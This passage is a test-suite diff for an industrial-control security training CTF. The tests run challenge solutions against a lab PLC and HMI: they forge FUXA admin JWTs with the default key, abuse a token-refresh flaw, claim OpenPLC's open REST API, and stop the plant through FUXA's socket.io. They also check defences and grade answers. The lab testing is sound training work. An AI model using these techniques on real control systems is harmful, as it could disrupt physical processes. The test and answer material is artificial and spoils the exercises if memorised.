+    # --- the attack ------------------------------------------------------
+
+    def test_forged_token_is_verified(self):
+        before = self._without("fuxa_jwt")
+        try:
+            ghost = _fuxa_forge({"id": "cybics-test-ghost", "groups": -1})
+            assert self._users_status(ghost) == 200, "FUXA refuses a token signed with its default key"
+
+            now = int(time.time())
+            refused = {
+                "real account": _fuxa_forge({"id": "admin", "groups": -1}),
+                "wrong key": _fuxa_forge({"id": "cybics-test-ghost", "groups": -1}, "not the key"),
+                "FUXA-issued shape": _fuxa_forge({"id": "cybics-test-ghost", "groups": -1,
+                                                  "iat": now, "exp": now + 3600}),
+            }
+            # Documented in the READMEs: FUXA signs an admin token for anyone,
+            # without key or password. It works, and verify must refuse it.
+            minted = self._refresh_mint()
+            assert self._users_status(minted) == 200, "FUXA's refresh token is not an admin token"
+            refused["FUXA token refresh"] = minted
+            for case, token in refused.items():
+                result = self._verify("fuxa_jwt", {"token": token})
+                assert not result["success"] and "flag" not in result, (case, result)
+
+            result = self._verify("fuxa_jwt", {"token": ghost})
+            assert result["success"], result
+            assert result.get("flag", "").startswith("CybICS(")
+        finally:
+            self._restore(before)
+
+    # --- the defence -----------------------------------------------------
+
+    def test_rotated_key_passes_the_defence_and_stops_the_attack(self):
+        before = self._without("defense_fuxa_jwt", "fuxa_jwt")
+        password_state = self._default_password_works()
+        container = self._container()
+        code, out = self._admin(f"docker exec {container} cp /_appdata/settings.js {self.BACKUP}")
+        assert code == 0, out
+        try:
+            result = self._verify("defense_fuxa_jwt")
+            assert not result["success"] and "flag" not in result, result
+
+            # README step 3, verbatim but for the container name.
+            add_key = _readme_command("defense_fuxa_jwt", "KEY=$(").replace("<fuxa>", container)
+            code, out = self._admin(add_key)
+            assert code == 0, out
+            # README step 4: the file still loads, with a 48-character key.
+            code, out = self._admin(
+                f"docker exec {container} node -e \"const s=require('/_appdata/settings.js'); "
+                f"console.log('ok, key length', s.secretCode.length)\"")
+            assert code == 0 and "ok, key length 48" in out, out
+
+            self._restart_fuxa(container)
+
+            ghost = _fuxa_forge({"id": "cybics-test-ghost", "groups": -1})
+            assert self._users_status(ghost) == 401, "a token signed with the default key still works"
+            result = self._verify("fuxa_jwt", {"token": ghost})
+            assert not result["success"] and "flag" not in result, result
+
+            # What defense_fuxa_jwt/README.md says the key does not fix: the
+            # refresh flaw still mints an admin token, now with the new key,
+            # and the attack's verify still refuses it.
+            minted = self._refresh_mint()
+            assert self._users_status(minted) == 200, "the refresh flaw no longer works after rotation"
+            result = self._verify("fuxa_jwt", {"token": minted})
+            assert not result["success"] and "flag" not in result, result
+
+            result = self._verify("defense_fuxa_jwt")
+            assert result["success"], result
+            assert result.get("flag", "").startswith("CybICS(")
+        finally:
+            code, out = self._admin(f"docker exec {container} mv {self.BACKUP} /_appdata/settings.js")
+            self._restart_fuxa(container)
+            assert code == 0, f"settings.js not restored: {out}"
+            self._restore(before)
+
+        ghost = _fuxa_forge({"id": "cybics-test-ghost", "groups": -1})
+        assert self._users_status(ghost) == 200, "FUXA is not back on its default key"
+        assert self._default_password_works() == password_state, "the FUXA admin password state changed"
+
+
+def _readme_block(module, heading):
+    """The first fenced bash block under `heading` in training/<module>/README.md."""
+    readme = (Path(__file__).resolve().parent.parent / "training" / module / "README.md").read_text(
+        encoding="utf-8")
+    section = readme.split(heading, 1)[1]
+    return section.split("```bash\n", 1)[1].split("```", 1)[0].strip()
+
+
+@pytest.mark.usefixtures("stack_ready")
+class TestOpenplcRestApi(_CtfProgress):
+    """
+    The Forgotten API: OpenPLC's REST API on 172.18.0.3:8443 lets the first
+    caller create an account while its user table is empty.
+
+    The PLC's port 8443 is not published on the host, so every request goes
+    through the landing page's admin shell, which runs on the host network
+    like the verify module. The claim and the release use the solution
+    script from landing's copy of training/, the same file the attack shell
+    has. The test needs the API unclaimed and leaves it unclaimed: the
+    account is deleted through the API in a finally block, and if that fails
+    the README's Reset command empties the user table. The PLC is never
+    stopped or reprogrammed.
+    """
+
+    API = "https://172.18.0.3:8443/api"
+    SCRIPT = "python3 /CybICS/training/openplc_restapi/openplc_restapi.py"
+    USER, PASSWORD = "cybics-test-claim", "cybics-test-pass-1"
+
+    def _curl(self, args):
+        code, out = self._admin(f"curl -sk --max-time 10 {args}")
+        assert code == 0, f"curl {args}: {out}"
+        return out
+
+    def _users_info(self):
+        return self._curl(f"{self.API}/get-users-info")
+
+    def _unclaimed(self):
+        return "No users found" in self._users_info()
+
+    def _reset(self):
+        code, out = self._admin(_readme_block("openplc_restapi", "### Reset"))
+        assert code == 0, f"the README's reset command failed: {out}"
+
+    def _verify(self, answers):
+        r = requests.post(f"{self.BASE}/ctf/verify/openplc_restapi", json={"answers": answers},
+                          timeout=60)
+        assert r.status_code == 200, r.text[:300]
+        return r.json()
+
+    def test_claim_is_verified_and_given_back(self):
+        assert self._unclaimed(), (
+            "OpenPLC's REST API is already claimed, so the challenge cannot be solved; "
+            "empty it with the Reset command in training/openplc_restapi/README.md")
+        before = self._without("openplc_restapi")
+        try:
+            # README step 3: the web interface's login is not an API account.
+            out = self._curl(f"-X POST {self.API}/login -H 'Content-Type: application/json' "
+                             "-d '{\"username\":\"openplc\",\"password\":\"openplc\"}'")
+            assert "Wrong username or password" in out, out
+
+            code, out = self._admin(f"{self.SCRIPT} claim --user {self.USER} --password {self.PASSWORD}")
+            assert code == 0 and "User created" in out and "STATUS:" in out, out
+
+            # The race is over: a second unauthenticated claim is refused.
+            out = self._curl(f"-X POST {self.API}/create-user -H 'Content-Type: application/json' "
+                             "-d '{\"username\":\"cybics-test-late\",\"password\":\"late-pass-12\"}'")
+            assert "User already created" in out, out
+
+            for wrong in ({"username": self.USER, "password": "not-the-password"},
+                          {"username": "openplc", "password": "openplc"},
+                          {"username": self.USER, "password": "short"}):
+                result = self._verify(wrong)
+                assert not result["success"] and "flag" not in result, (wrong, result)
+
+            result = self._verify({"username": self.USER, "password": self.PASSWORD})
+            assert result["success"], result
+            assert result.get("flag", "").startswith("CybICS(")
+        finally:
+            self._admin(f"{self.SCRIPT} release --user {self.USER} --password {self.PASSWORD}")
+            if not self._unclaimed():
+                self._reset()
+            self._restore(before)
+        assert self._unclaimed(), "the REST API was not given back"
+
+    def test_readme_reset_empties_the_user_table(self):
+        assert self._unclaimed(), "OpenPLC's REST API is already claimed"
+        try:
+            out = self._curl(f"-X POST {self.API}/create-user -H 'Content-Type: application/json' "
+                             f"-d '{{\"username\":\"{self.USER}\",\"password\":\"{self.PASSWORD}\"}}'")
+            assert "User created" in out, out
+            assert not self._unclaimed()
+            self._reset()
+            assert self._unclaimed(), "the README's Reset command left a user behind"
+            # The running API works on the emptied table without a restart.
+            out = self._curl(f"-X POST {self.API}/create-user -H 'Content-Type: application/json' "
+                             f"-d '{{\"username\":\"{self.USER}\",\"password\":\"{self.PASSWORD}\"}}'")
+            assert "User created" in out, out
+        finally:
+            if not self._unclaimed():
+                self._reset()
+        assert self._unclaimed()
+
+
+# ===============================================================================
+# HMI Project Recon
+# ===============================================================================
+
+@pytest.mark.usefixtures("stack_ready")
+class TestHmiProjectRecon(_CtfProgress):
+    """
+    HMI Project Recon end to end: FUXA hands its project to a client without
+    a token, the solution script (landing's copy of training/, run in the
+    admin shell, which like the attack shell reaches 172.18.0.4) turns it into
+    the four answers, the plant confirms the wire addresses with a read, and
+    verify refuses FUXA's 1-based numbers before it hands out the flag for
+    the right ones. Nothing is written to FUXA or the PLC; only the CTF
+    progress changes and it is put back.
+    """
+
+    FUXA = f"http://{SERVER_IP}:{FUXA_PORT}"
+    SCRIPT = "python3 /CybICS/training/hmi_project_recon/hmi_recon.py --live"
+
+    def _verify(self, answers):
+        r = requests.post(f"{self.BASE}/ctf/verify/hmi_project_recon", json={"answers": answers},
+                          timeout=60)
+        assert r.status_code == 200, r.text[:300]
+        return r.json()
+
+    def test_project_is_anonymous_and_its_map_earns_the_flag(self):
+        # README step 2: no token, the whole project; the user list stays locked.
+        r = requests.get(f"{self.FUXA}/api/project", timeout=READ_TIMEOUT)
+        assert r.status_code == 200 and "devices" in r.json(), r.text[:200]
+        assert requests.get(f"{self.FUXA}/api/users", timeout=READ_TIMEOUT).status_code == 401
+
+        code, out = self._admin(self.SCRIPT)
+        assert code == 0, out
+        plc = re.search(r"OpenPLC\s+ModbusTCP\s+address=(\S+)", out)
+        stop = re.search(r"STOP / SHUTDOWN\s+onToggleValue\s+-> OpenPLC/stop \(holding register (\d+)\)", out)
+        comp = re.search(r"SystemView\s+Comp\.\s+onToggleValue\s+-> OpenPLC/compressor \(coil (\d+)\)", out)
+        hpt = re.search(r"OpenPLC\s+HPT\s+holding register\s+(\d+)\s+(\d+)\s+(t_[0-9a-f-]+)", out)
+        assert plc and stop and comp and hpt, out
+        answers = {"plc": plc.group(1), "stop_register": stop.group(1),
+                   "compressor_coil": comp.group(1), "hpt_tag_id": hpt.group(3)}
+
+        # README step 5: FUXA reads the tag for anyone by its ID, and the wire
+        # address holds the same pressure while FUXA's own number reads 0.
+        fuxa_address, wire = int(hpt.group(1)), int(hpt.group(2))
+        assert wire == fuxa_address - 1
+        r = requests.get(f"{self.FUXA}/api/getTagValue", timeout=READ_TIMEOUT,
+                         params={"ids": json.dumps([answers["hpt_tag_id"]])})
+        assert r.status_code == 200 and r.json()[0]["id"] == answers["hpt_tag_id"], r.text[:200]
+        hpt_hmi = r.json()[0]["value"]
+        client = ModbusTcpClient(host=SERVER_IP, port=MODBUS_PORT, timeout=CONNECTION_TIMEOUT)
+        assert client.connect(), "cannot reach the PLC's Modbus server"
+        try:
+            reply = modbus_call(client, client.read_holding_registers, wire, count=2)
+        finally:
+            client.close()
+        assert not reply.isError(), reply
+        hpt_wire, hpt_neighbour = reply.registers
+        # FUXA polls once a second and the plant moves about one bar per
+        # second, so the two reads differ by a few units at most; 20 leaves
+        # room for a slow poll. HR 1127 is %MW103, the word between hpt
+        # (%MW102) and stop (%MW104): software/OpenPLC/cybICS.st declares
+        # nothing there and nothing writes it, so it reads 0. If the register
+        # map ever puts a variable there, this neighbour check must change.
+        assert abs(hpt_wire - hpt_hmi) <= 20 and hpt_neighbour == 0, (hpt_hmi, hpt_wire, hpt_neighbour)
+
+        before = self._without("hmi_project_recon")
+        try:
+            for wrong in ({**answers, "stop_register": str(int(answers["stop_register"]) + 1)},
+                          {**answers, "compressor_coil": str(int(answers["compressor_coil"]) + 1)},
+                          {**answers, "plc": "172.18.0.4:1881"}):
+                result = self._verify(wrong)
+                assert not result["success"] and "flag" not in result, (wrong, result)
+            result = self._verify(answers)
+            assert result["success"], result
+            assert result.get("flag", "").startswith("CybICS(")
+        finally:
+            self._restore(before)
+
+
+# ===============================================================================
+# Register Map Recon (register_map_recon)
+# ===============================================================================
+
+@pytest.mark.usefixtures("stack_ready")
+class TestRegisterMapRecon(_CtfProgress):
+    """
+    Register Map Recon end to end, with reads only: the sweep helper runs in
+    landing's admin shell (pymodbus 3.5, the oldest the README promises), the
+    live PLC shows the two latches where the verify module expects them -- each
+    one holds 0 or 1 and drives its coil, and S7comm DB1002 mirrors them --
+    the compressor latch is watched until it releases and the HPT at that read
+    must be the graded value, and verify refuses typical mistakes before it
+    hands out the flag. Nothing is written to the PLC; only the CTF progress
+    changes and it is put back.
+
+    The release wait is bounded: the compressor latch is on for about 35 s and
+    off for about 35 s, so a 1 -> 0 switch comes within 80 s in a running plant.
+    A release while the GST is at 50 or below is the low-gas guard, not the
+    HPT threshold, and is skipped; on a slow CI runner one came at HPT 79.
+    """
+
+    SCRIPT = ("python3 /CybICS/training/register_map_recon/map_registers.py "
+              "--host 172.18.0.3 --seconds 2 --interval 0.5")
+    COMPRESSOR_LATCH, REFILL_LATCH = 1224, 1226     # %MW200, %MW202
+    GST, HPT, STOP, MANUAL = 1124, 1126, 1128, 1130
+    RELEASE_HPT, S7_OFFSET = 90, 400
+    RELEASE_WAIT = 150
+
+    def _verify(self, answers):
+        r = requests.post(f"{self.BASE}/ctf/verify/register_map_recon", json={"answers": answers},
+                          timeout=60)
+        assert r.status_code == 200, r.text[:300]
+        return r.json()
+
+    def _words(self, client):
+        """One read of HR 1124..1226, so the latches and the pressures come from one scan."""
+        reply = modbus_call(client, client.read_holding_registers, self.GST,
+                            count=self.REFILL_LATCH - self.GST + 1)
+        assert not reply.isError(), reply
+        return {self.GST + i: v for i, v in enumerate(reply.registers)}
+
+    def test_the_helper_runs_and_translates(self):
+        code, out = self._admin(self.SCRIPT)
+        assert code == 0, out
+        # GST is never 0 in a running plant; its row carries every translation.
+        assert re.search(r"^\s*1124 \w+ .* 1125\s+%MW100\s+DB1002\.DBW200$", out, re.M), out
+        assert "holding registers stayed 0" in out, out
+
+    def test_the_latches_are_where_the_check_expects_them(self):
+        import snap7  # tests/requirements.txt; a missing library is a failure, not a skip
+        client = ModbusTcpClient(host=SERVER_IP, port=MODBUS_PORT, timeout=CONNECTION_TIMEOUT)
+        assert client.connect(), "cannot reach the PLC's Modbus server"
+        s7 = snap7.client.Client()
+        s7.connect(SERVER_IP, 0, 1, S7_SERVER_PORT)
+        try:
+            words = self._words(client)
+            assert words[self.STOP] == 0 and words[self.MANUAL] == 0, \
+                "the plant must run in automatic mode for its latches to drive the coils"
+            # Separate requests can straddle a 50 ms scan that switches a latch,
+            # so the pairs must agree in most of a few tries, not in every one.
+            coil_ok = s7_ok = 0
+            for _ in range(10):
+                words = self._words(client)
+                latches = (words[self.COMPRESSOR_LATCH], words[self.REFILL_LATCH])
+                assert set(latches) <= {0, 1} and words[self.COMPRESSOR_LATCH + 1] == 0, words
+                coils = modbus_call(client, client.read_coils, 0, count=4)
+                assert not coils.isError(), coils
+                coil_ok += (int(coils.bits[1]), int(coils.bits[3])) == latches
+                raw = s7.db_read(1002, self.S7_OFFSET, 6)
+                s7_ok += (int.from_bytes(raw[0:2], "big"), int.from_bytes(raw[4:6], "big")) == latches
+                time.sleep(0.2)
+            assert coil_ok >= 8 and s7_ok >= 8, (coil_ok, s7_ok)
+
+            # README step 5: the HPT at the read where the compressor latch falls back to 0.
+            previous, deadline, release = None, time.time() + self.RELEASE_WAIT, None
+            while time.time() < deadline and release is None:
+                words = self._words(client)
+                latch = words[self.COMPRESSOR_LATCH]
+                # The latch also lets go early when the GST drops to 50 (cybICS.st);
+                # only a release with gas left is the HPT threshold the README asks for.
+                if previous == 1 and latch == 0 and words[self.GST] > 50:
+                    release = words[self.HPT]
+                previous = latch
+                time.sleep(0.1)
+            assert release is not None, f"the compressor latch did not release in {self.RELEASE_WAIT} s"
+            assert abs(release - self.RELEASE_HPT) <= 1, release
+        finally:
+            s7.disconnect()
+            client.close()
+
+    def test_the_observed_map_earns_the_flag(self):
+        answers = {"compressor_latch": str(self.COMPRESSOR_LATCH), "refill_latch": str(self.REFILL_LATCH),
+                   "release_hpt": str(self.RELEASE_HPT), "s7_offset": f"DB1002.DBW{self.S7_OFFSET}"}
+        before = self._without("register_map_recon")
+        try:
+            for wrong in ({**answers, "compressor_latch": answers["refill_latch"],
+                           "refill_latch": answers["compressor_latch"]},
+                          {**answers, "compressor_latch": str(self.COMPRESSOR_LATCH + 1)},
+                          {**answers, "s7_offset": str(self.S7_OFFSET // 2)}):
+                result = self._verify(wrong)
+                assert not result["success"] and "flag" not in result, (wrong, result)
+            result = self._verify(answers)
+            assert result["success"], result
+            assert result.get("flag", "").startswith("CybICS(")
+        finally:
+            self._restore(before)
+
+
+# ===============================================================================
+# Packet Anatomy (packet_anatomy)
+# ===============================================================================
+
+class TestPacketAnatomy(_CtfProgress):
+    """
+    Packet Anatomy end to end: the solution script (landing's copy of
+    training/, run in the admin shell, which reaches the PLC at 172.18.0.3
+    like the attack shell) builds the frames with struct, sends the two reads
+    over a raw TCP connection and prints the PLC's answers; verify refuses
+    typical mistakes without a flag and returns the flag for the script's
+    frames. The script never sends its write frame, so nothing is written to
+    the PLC; only the CTF progress changes and it is put back.
+    """
+
+    SCRIPT = "python3 /CybICS/training/packet_anatomy/frames.py --tid 0x5151 --unit 7"
+
+    def _verify(self, answers):
+        r = requests.post(f"{self.BASE}/ctf/verify/packet_anatomy", json={"answers": answers},
+                          timeout=60)
+        assert r.status_code == 200, r.text[:300]
+        return r.json()
+
+    def test_hand_built_frames_earn_the_flag(self):
+        code, out = self._admin(self.SCRIPT)
+        assert code == 0, out
+        answers = {name: re.search(rf"^{name}\s*:\s*([0-9a-f ]+?)\s*(?:\(not sent\))?$", out, re.M)
+                   for name in ("read_request", "read_response", "write_request", "exception")}
+        assert all(answers.values()), out
+        answers = {name: m.group(1) for name, m in answers.items()}
+        assert "(not sent)" in out
+
+        # The PLC copied transaction and unit ID and answered three registers.
+        response = bytes.fromhex(answers["read_response"].replace(" ", ""))
+        assert response[:2] == b"\x51\x51" and response[6] == 7 and response[7:9] == b"\x03\x06", out
+        assert answers["exception"].replace(" ", "").endswith("8302"), out
+
+        before = self._without("packet_anatomy")
+        try:
+            off_by_one = answers["read_request"].replace("04 64 00 03", "04 65 00 03")
+            other_tid = "00 01" + answers["read_response"][5:]
+            for wrong in ({**answers, "read_request": off_by_one},
+                          {**answers, "read_response": other_tid},
+                          {**answers, "exception": answers["exception"][:-2] + "03"}):
+                assert wrong != answers
+                result = self._verify(wrong)
+                assert not result["success"] and "flag" not in result, (wrong, result)
+            result = self._verify(answers)
+            assert result["success"], result
+            assert result.get("flag", "").startswith("CybICS(")
+        finally:
+            self._restore(before)
+
+
+# ===============================================================================
+# Incident PCAP (incident_pcap)
+# ===============================================================================
+
+class TestIncidentPcap(_CtfProgress):
+    """
+    Incident PCAP end to end: the landing page serves the capture the README
+    links to, byte for byte the committed file; the analysis in
+    tests/test_incident_pcap.py (the README's steps, independent of the
+    generator) reads the four answers out of the downloaded bytes; verify
+    refuses the tempting wrong timelines and hands out the flag for the right
+    one. Nothing touches the plant; only the CTF progress changes and it is
+    put back.
+    """
+
+    def _verify(self, answers):
+        r = requests.post(f"{self.BASE}/ctf/verify/incident_pcap", json={"answers": answers},
+                          timeout=60)
+        assert r.status_code == 200, r.text[:300]
+        return r.json()
+
+    def test_the_served_capture_yields_the_flag(self):
+        from test_incident_pcap import analyse
+        r = requests.get(f"{self.BASE}/ctf/challenge/incident_pcap/incident.pcap",
+                         timeout=READ_TIMEOUT)
+        assert r.status_code == 200, r.status_code
+        committed = (Path(__file__).resolve().parent.parent / "training" / "incident_pcap"
+                     / "incident.pcap").read_bytes()
+        assert r.content == committed, "landing serves a stale capture: rebuild landing"
+
+        found = analyse(r.content)
+        answers = {
+            "attacker_mac": found["rogue"],
+            "attacker_ips": ", ".join(sorted(found["ips"])),
+            "poison_frame": str(found["poison"]),
+            "stop_frames": ", ".join(str(n) for n, *_ in found["stops"]),
+        }
+        hmi_writes = sorted([n for n, *_ in found["stops"]][:1] + [n for n, _, _ in found["runs"]])
+
+        before = self._without("incident_pcap")
+        try:
+            for wrong in ({**answers, "attacker_mac": "02:42:ac:12:00:04"},
+                          {**answers, "attacker_ips": found["own_ip"]},
+                          {**answers, "stop_frames": ", ".join(map(str, hmi_writes))}):
+                result = self._verify(wrong)
+                assert not result["success"] and "flag" not in result, (wrong, result)
+            result = self._verify(answers)
+            assert result["success"], result
+            assert result.get("flag", "").startswith("CybICS(")
+        finally:
+            self._restore(before)
+
+
+# ===============================================================================
+# Physics Never Lies (physics_forensics)
+# ===============================================================================
+
+class TestPhysicsForensics(_CtfProgress):
+    """
+    Physics Never Lies end to end: the landing page serves the historian
+    export the README links to, byte for byte the committed file; the
+    analysis in tests/test_physics_forensics.py (the README's rules,
+    independent of the generator) reads the three answers out of the
+    download; verify refuses the tempting wrong answers (the later sysSen
+    contradiction, the value the HMI showed, the GST) and hands out the flag
+    for the right ones. Nothing touches the plant; only the CTF progress
+    changes and it is put back.
+    """
+
+    def _verify(self, answers):
+        r = requests.post(f"{self.BASE}/ctf/verify/physics_forensics", json={"answers": answers},
+                          timeout=60)
+        assert r.status_code == 200, r.text[:300]
+        return r.json()
+
+    def test_the_served_export_yields_the_flag(self):
+        from test_physics_forensics import analyse
+        r = requests.get(f"{self.BASE}/ctf/challenge/physics_forensics/historian.csv",
+                         timeout=READ_TIMEOUT)
+        assert r.status_code == 200, r.status_code
+        committed = (Path(__file__).resolve().parent.parent / "training" / "physics_forensics"
+                     / "historian.csv").read_bytes()
+        assert r.content == committed, "landing serves a stale export: rebuild landing"
+
+        found = analyse(r.content.decode("utf-8"))
+        answers = {"forged_value": found["forged"],
+                   "first_forged": found["first"].split()[1],
+                   "true_hpt": str(found["true_hpt"])}
+
+        before = self._without("physics_forensics")
+        try:
+            for wrong in ({**answers, "first_forged": found["sensor_lie"]},
+                          {**answers, "true_hpt": str(found["shown_last"])},
+                          {**answers, "forged_value": "gst"}):
+                result = self._verify(wrong)
+                assert not result["success"] and "flag" not in result, (wrong, result)
+            result = self._verify(answers)
+            assert result["success"], result
+            assert result.get("flag", "").startswith("CybICS(")
+        finally:
+            self._restore(before)
+
+
+# ===============================================================================
+# Whispering PLC (modbus_covert_c2)
+# ===============================================================================
+
+class TestModbusCovertC2(_CtfProgress):
+    """
+    Whispering PLC end to end: the landing page serves the capture the README
+    links to, byte for byte the committed file; the analysis in
+    tests/test_modbus_covert_c2.py (the README's steps, independent of the
+    generator) reads the four answers out of the download; verify refuses the
+    tempting wrong answers and hands out the flag for the right ones. One
+    check reads the live PLC the way the implant in the capture does, to keep
+    the README's claim true that such a read succeeds with zeros. Nothing is
+    written to the plant; only the CTF progress changes and it is put back.
+    """
+
+    def _verify(self, answers):
+        r = requests.post(f"{self.BASE}/ctf/verify/modbus_covert_c2", json={"answers": answers},
+                          timeout=60)
+        assert r.status_code == 200, r.text[:300]
+        return r.json()
+
+    def test_the_live_plc_answers_an_unused_word_with_zero(self):
+        client = ModbusTcpClient(host=SERVER_IP, port=MODBUS_PORT, timeout=CONNECTION_TIMEOUT)
+        try:
+            assert client.connect(), "Modbus not reachable"
+            for address in (0x0520, 0x057E):          # the printable range the implant uses
+                result = modbus_call(client, client.read_holding_registers, address, count=1)
+                assert not result.isError(), (hex(address), result)
+                assert result.registers == [0], (hex(address), result.registers)
+        finally:
+            client.close()
+
+    def test_the_served_capture_yields_the_flag(self):
+        from test_modbus_covert_c2 import analyse
+        r = requests.get(f"{self.BASE}/ctf/challenge/modbus_covert_c2/baseline.pcap",
+                         timeout=READ_TIMEOUT)
+        assert r.status_code == 200, r.status_code
+        committed = (Path(__file__).resolve().parent.parent / "training" / "modbus_covert_c2"
+                     / "baseline.pcap").read_bytes()
+        assert r.content == committed, "landing serves a stale capture: rebuild landing"
+
+        found = analyse(r.content)
+        answers = {
+            "implant": "%s:%d" % found["implant"],
+            "interval": str(found["interval"]),
+            "message": found["message"],
+            "read_range": "%d-%d" % found["range"],
+        }
+        gateway = next(k for k in found["others"] if k[0] == found["implant"][0])
+        rotated = found["decoded"][:len(found["message"]) + 1]     # read from the first frame
+
+        before = self._without("modbus_covert_c2")
+        try:
+            for wrong in ({**answers, "implant": "%s:%d" % gateway},
+                          {**answers, "message": rotated},
+                          {**answers, "read_range": "%d-%d" % (found["range"][0], found["range"][1] + 1)}):
+                result = self._verify(wrong)
+                assert not result["success"] and "flag" not in result, (wrong, result)
+            result = self._verify(answers)
+            assert result["success"], result
+            assert result.get("flag", "").startswith("CybICS(")
+        finally:
+            self._restore(before)
+
+
+# ===============================================================================
+# Trusted Writer (fuxa_trusted_writer)
+# ===============================================================================
+
+def _trusted_writer_script():
+    import importlib.util
+    path = Path(__file__).resolve().parent.parent / "training" / "fuxa_trusted_writer" / "trusted_writer.py"
+    spec = importlib.util.spec_from_file_location("trusted_writer", path)
+    module = importlib.util.module_from_spec(spec)
+    spec.loader.exec_module(module)
+    return module
+
+
+@pytest.mark.usefixtures("stack_ready")
+class TestFuxaTrustedWriter(_CtfProgress):
+    """
+    The Trusted Writer challenge end to end, with the shipped solution script.
+
+    First the refusal: a stop written straight over Modbus from the test host
+    is journaled with that host's address, so verify must refuse it although
+    no alert fires. Then the solve: the script sends FUXA the HMI's own
+    socket.io 'device-values' set message as a guest, FUXA writes register
+    1128 from 172.18.0.4, the IDS journal shows it as service fuxa, and verify
+    hands out the flag. It also pins the REST route as the README describes
+    it: setTagValue refuses an operator token and takes a forged admin token,
+    which restores the plant.
+
+    The verify check needs an alert-free minute before FUXA's write, and
+    earlier tests in the suite raise alerts on purpose, so the test waits for
+    the IDS to fall quiet first. The plant is restored in a finally block
+    (through FUXA, then directly over Modbus as a fallback), the IDS is stopped
+    again if the test started it, and the CTF progress is put back.
+    """
+
+    IDS = f"http://{SERVER_IP}:{IDS_PORT}"
+    FUXA = f"http://{SERVER_IP}:{FUXA_PORT}"
+    QUIET = 65            # the check's QUIET_BEFORE plus a margin
+    QUIET_TIMEOUT = 240
+
+    _modbus_words = staticmethod(TestDnp3SideDoor._modbus_words)
+    _modbus_write_stop = staticmethod(TestDnp3SideDoor._modbus_write_stop)
+
+    def _verify(self):
+        r = requests.post(f"{self.BASE}/ctf/verify/fuxa_trusted_writer", json={}, timeout=30)
+        assert r.status_code == 200, r.text[:300]
+        return r.json()
+
+    def _wait_until_quiet(self):
+        """Wait until the IDS has captured for QUIET seconds without an alert but arp_spoof."""
+        from datetime import datetime, timedelta
+        deadline = time.time() + self.QUIET_TIMEOUT
+        while True:
+            status = requests.get(f"{self.IDS}/api/status", timeout=READ_TIMEOUT).json()
+            now = datetime.fromisoformat(status["now"])
+            started = datetime.fromisoformat(status["stats"]["started_at"])
+            alerts = requests.get(f"{self.IDS}/api/alerts", timeout=READ_TIMEOUT).json()["alerts"]
+            recent = [a for a in alerts if a.get("rule") != "arp_spoof"
+                      and datetime.fromisoformat(a["timestamp"]) > now - timedelta(seconds=self.QUIET)]
+            if not recent and started < now - timedelta(seconds=self.QUIET):
+                return
+            assert time.time() < deadline, f"the IDS did not fall quiet: {recent[-3:]}"
+            time.sleep(5)
+
+    def _newest_stop_write(self):
+        writes = requests.get(f"{self.IDS}/api/modbus/writes", timeout=READ_TIMEOUT).json()["writes"]
+        hits = [w for w in writes if w["address"] <= STOP_REGISTER < w["address"] + w["count"]
+                and w["function"] in (6, 16)]
+        return hits[-1] if hits else None
+
+    def test_stop_through_fuxa_is_silent_and_verified_then_restored(self):
+        script = _trusted_writer_script()
+        device_id, tag_id, wire = script.find_tag(self.FUXA, "stop")
+        assert wire == STOP_REGISTER
+
+        before = self._without("fuxa_trusted_writer")
+        status = requests.get(f"{self.IDS}/api/status", timeout=READ_TIMEOUT).json()
+        was_active = status.get("active", False)
+        if not was_active:
+            requests.post(f"{self.IDS}/api/start", timeout=READ_TIMEOUT)
+        try:
+            assert self._modbus_words() == (0, 0), "the plant was not in automatic before the test"
+            self._wait_until_quiet()
+
+            # A direct stop from this host: silent, but the journal names us.
+            self._modbus_write_stop(1)
+            time.sleep(2)
+            newest = self._newest_stop_write()
+            assert newest and newest["src"] != "172.18.0.4" and newest["values"][0] == 1, newest
+            result = self._verify()
+            assert not result["success"] and "flag" not in result, result
+            assert "not from the HMI" in json.dumps(result["checks"]), result
+            self._modbus_write_stop(0)
+
+            # The attack: a guest asks FUXA over socket.io, as the README shows.
+            script.write_socket(self.FUXA, device_id, tag_id, 1)
+            deadline = time.time() + 15
+            while self._modbus_words()[0] != 1:
+                assert time.time() < deadline, "FUXA did not write the stop flag"
+                time.sleep(1)
+            newest = self._newest_stop_write()
+            assert newest["src"] == "172.18.0.4" and newest["service"] == "fuxa", newest
+            assert newest["values"][STOP_REGISTER - newest["address"]] == 1
+
+            result = self._verify()
+            assert result["success"], result
+            config = Path(__file__).resolve().parent.parent / "software" / "landing" / "ctf_config.json"
+            flags = {c["id"]: c["flag"] for cat in json.loads(config.read_text())["categories"].values()
+                     for c in cat["challenges"]}
+            assert result["flag"] == flags["fuxa_trusted_writer"]
+
+            # The REST route: an operator may not, an administrator token may.
+            operator = requests.post(f"{self.FUXA}/api/signin", timeout=READ_TIMEOUT,
+                                     json={"username": "operator", "password": "operator"})
+            token = operator.json()["data"]["token"]
+            refused = requests.post(f"{self.FUXA}/api/setTagValue", timeout=READ_TIMEOUT,
+                                    headers={"x-access-token": token},
+                                    json={"tags": [{"id": tag_id, "value": 0}]})
+            assert refused.status_code == 401, refused.text[:200]
+            restored = requests.post(f"{self.FUXA}/api/setTagValue", timeout=READ_TIMEOUT,
+                                     headers={"x-access-token": _fuxa_forge(
+                                         {"id": "cybics-test-ghost", "groups": -1})},
+                                     json={"tags": [{"id": tag_id, "value": 0}]})
+            assert restored.status_code == 200, restored.text[:200]
+            deadline = time.time() + 15
+            while self._modbus_words()[0] != 0:
+                assert time.time() < deadline, "setTagValue did not restore the stop flag"
+                time.sleep(1)
+        finally:
+            try:
+                if self._modbus_words()[0] != 0:
+                    script.write_socket(self.FUXA, device_id, tag_id, 0)
+                    time.sleep(3)
+                if self._modbus_words()[0] != 0:
+                    self._modbus_write_stop(0)
+            finally:
+                if not was_active:
+                    requests.post(f"{self.IDS}/api/stop", timeout=READ_TIMEOUT)
+                self._restore(before)
+
+        assert self._modbus_words() == (0, 0), "stop is not back to 0"
+
+
+# ===============================================================================
+# Close the Side Doors (defense_unused_protocols)
+# ===============================================================================
+
+@pytest.mark.usefixtures("stack_ready")
+class TestDefenseUnusedProtocols(_CtfProgress):
+    """
+    Close the Side Doors end to end: switch S7, DNP3 and EtherNet/IP off in
+    OpenPLC's Settings page (the same form POST a browser sends), block the
+    REST API on 8443 with the README's iptables rule, see verify refuse a
+    firewall rule in front of a running S7 server and pass the real
+    hardening, then undo it the README's way.
+
+    The defence closes the doors that the S7, DNP3 and REST API challenges
+    and conftest's readiness gate (port 102) need, so the PLC is reopened in
+    a finally block whatever fails, and the test asserts S7, DNP3 and
